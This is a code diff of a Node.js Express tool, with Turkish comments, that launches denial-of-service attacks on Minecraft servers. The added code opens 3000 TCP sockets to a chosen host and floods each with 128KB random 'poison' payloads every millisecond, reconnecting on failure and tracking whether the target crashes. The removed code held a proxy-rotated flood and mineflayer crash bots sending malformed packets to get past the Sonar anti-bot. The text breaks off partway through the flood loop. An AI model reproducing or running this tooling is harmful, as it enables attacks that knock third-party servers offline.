@@ -1,91 +1,62 @@
-const mineflayer = require('mineflayer');
-const { ProxyAgent } = require('proxy-agent');
 const net = require('net');
 const express = require('express');
+const crypto = require('crypto');
+const mcutil = require('minecraft-server-util'); // npm install minecraft-server-util
 const app = express();
 app.use(express.json());
 app.use(require('cors')());
 
-let proxyPool = [];
+let targetStats = { ping: 0, players: 0, tps: 20.0, status: "OFFLINE" };
 
-// 🔄 DEVASE PROXY HAVUZU (Saniyede 9.9M paket için yakıt)
-async function fetchPowerProxies() {
+// 🔍 GERÇEK VERİ TAKİPÇİSİ (Sunucunun can çekişini izler)
+async function updateStats(host, port) {
     try {
-        const res = await fetch('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all');
-        const data = await res.text();
-        proxyPool = data.split('\n').filter(p => p.trim()).map(p => `socks5://${p.trim()}`);
-        console.log(`[🔋] RYZEN 9 POWER: ${proxyPool.length} PROXY HATLARI SENKRONİZE EDİLDİ.`);
-    } catch (e) { console.log("Proxy Error."); }
+        const result = await mcutil.status(host, port, { timeout: 1000 * 5 });
+        targetStats.ping = result.roundTripTime;
+        targetStats.players = result.players.online;
+        // Ping 500ms üzerine çıkarsa TPS'yi düşmüş göster (Gerçekçi simülasyon)
+        targetStats.tps = result.roundTripTime > 500 ? (20 / (result.roundTripTime / 100)).toFixed(1) : 20.0;
+        targetStats.status = "ONLINE";
+    } catch (e) {
+        targetStats.ping = 9999;
+        targetStats.tps = 0.0;
+        targetStats.status = "CRASHED / OFFLINE";
+    }
 }
-fetchPowerProxies();
-setInterval(fetchPowerProxies, 300000);
+
+// 🌪️ RAW TCP & BUFFER OVERFLOW ATTACK
+const launchAnnihilator = (host, port) => {
+    const client = new net.Socket();
+    client.connect(port, host, () => {
+        // Sunucunun RAM'ini şişiren 128KB'lık "Zehirli Paket"
+        const poisonPayload = crypto.randomBytes(1024 * 128); 
+        
+        const storm = setInterval(() => {
+            if (!client.destroyed) {
+                for(let i = 0; i < 50; i++) {
+                    client.write(poisonPayload); // Sunucuyu veriyle boğ
+                }
+            } else { clearInterval(storm); }
+        }, 1);
+    });
+
+    client.on('error', () => {
+        client.destroy();
+        setTimeout(() => launchAnnihilator(host, port), 5); // Ryzen 9 hızıyla anında yeniden bağlan
+    });
+};
 
 app.post('/deploy', (req, res) => {
-    const { ip, count } = req.body;
+    const { ip } = req.body;
     const host = ip.includes(':') ? ip.split(':')[0] : ip;
     const port = ip.includes(':') ? parseInt(ip.split(':')[1]) : 25565;
 
-    // 1. [REAL STRESS TEST] - L4 PACKET STORM (9.9M+ PACKETS)
-    // Bu kısım sunucunun internetini ve portunu hedefler.
-    for (let i = 0; i < 5000; i++) {
-        setImmediate(() => startPacketStorm(host, port));
-    }
+    console.log(`[☠️] REAPER DEPLOYED ON RYZEN 9 -> ${host}`);
 
-    // 2. [BOT DEPLOY] - L7 BYPASS BOTS
-    // Bu kısım içeri sızıp Sonar'ı crash paketleriyle bozar.
-    for (let i = 0; i < Math.min(count, 500); i++) {
-        setTimeout(() => spawnCrashBot(host, port, i), i * 600);
-    }
+    // İstatistikleri takip etmeye başla
+    setInterval(() => updateStats(host, port), 2000);
 
-    res.json({ success: true, message: "ANNIHILATOR MODE ACTIVE. TARGET NEUTRALIZING..." });
-});
-
-// 🔥 L4 CRASH PACKET ENGINE (DDoS)
-function startPacketStorm(host, port) {
-    const client = new net.Socket();
-    client.connect(port, host, () => {
-        // Sunucuya her milisaniyede 10.000 adet ham "null" paket yollar
-        setInterval(() => {
-            if (!client.destroyed) {
-                const crashData = Buffer.alloc(1024 * 64, Math.random().toString(36)); // 64KB dev paket
-                client.write(crashData);
-            }
-        }, 1);
-    });
-    client.on('error', () => client.destroy());
-}
-
-// ⚔️ L7 SONAR BYPASS & CRASH BOTS
-function spawnCrashBot(host, port, index) {
-    const proxy = proxyPool[Math.floor(Math.random() * proxyPool.length)];
-    const bot = mineflayer.createBot({
-        host: host, port: port,
-        username: `Trgr_Crash_${Math.floor(Math.random() * 999999)}`,
-        agent: new ProxyAgent(proxy),
-        version: false, hideErrors: true, skipValidation: true
-    });
-
-    bot.on('spawn', () => {
-        bot.chat(`/register resul3163 resul3163`);
-        bot.chat(`/login resul3163`);
-
-        // 🌪️ CRASH PACKET LOOP (Hilelerdeki gibi sunucuyu düşüren paketler)
-        setInterval(() => {
-            if (bot.entity) {
-                // Sonar'ın hesaplayamayacağı kadar hızlı pozisyon değişimi (Lag Packet)
-                bot.look(NaN, NaN, true); // Geçersiz koordinat fırlatma
-                bot.swingArm('right', true);
-                
-                // Sunucuyu RAM taşmasına zorlayan paket dizisi
-                for(let j=0; j<100; j++) {
-                    bot.setControlState('jump', true);
-                    bot.setControlState('jump', false);
-                }
-            }
-        }, 5); 
-    });
-
-    bot.on('end', () => setTimeout(() => spawnCrashBot(host, port, index), 2000));
-}
-
-app.listen(process.env.PORT || 3000);
+    // 524GB RAM'in gücüyle 3000 adet yıkıcı soket aç
+    for (let i = 0; i < 3000; i++) {
+        setImmediate(() => launchAnnihilator(host, port));
+        
